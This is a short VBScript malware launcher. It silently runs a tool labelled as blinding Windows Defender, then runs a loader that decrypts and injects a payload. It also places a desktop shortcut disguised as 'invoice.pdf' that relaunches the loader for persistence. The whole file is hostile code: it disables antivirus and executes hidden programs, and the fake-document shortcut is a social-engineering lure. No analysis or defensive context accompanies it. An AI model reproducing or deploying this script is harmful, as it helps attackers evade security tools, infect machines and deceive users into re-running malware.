Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
dl = ws.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads"

' Step 1: Blind Defender via UnDefend.exe
ws.Run """" & dl & "\UnDefend.exe""", 0, False
WScript.Sleep 3000

' Step 2: Decrypt + inject via loader.exe  
ws.Run """" & dl & "\loader.exe""", 0, False

' Desktop shortcut for future reconnects
Set sc = ws.CreateShortcut(ws.SpecialFolders("Desktop") & "\invoice.pdf.lnk")
sc.TargetPath = dl & "\loader.exe"
sc.WindowStyle = 7
sc.IconLocation = "%SystemRoot%\System32\shell32.dll,23"
sc.WorkingDirectory = dl
sc.Save
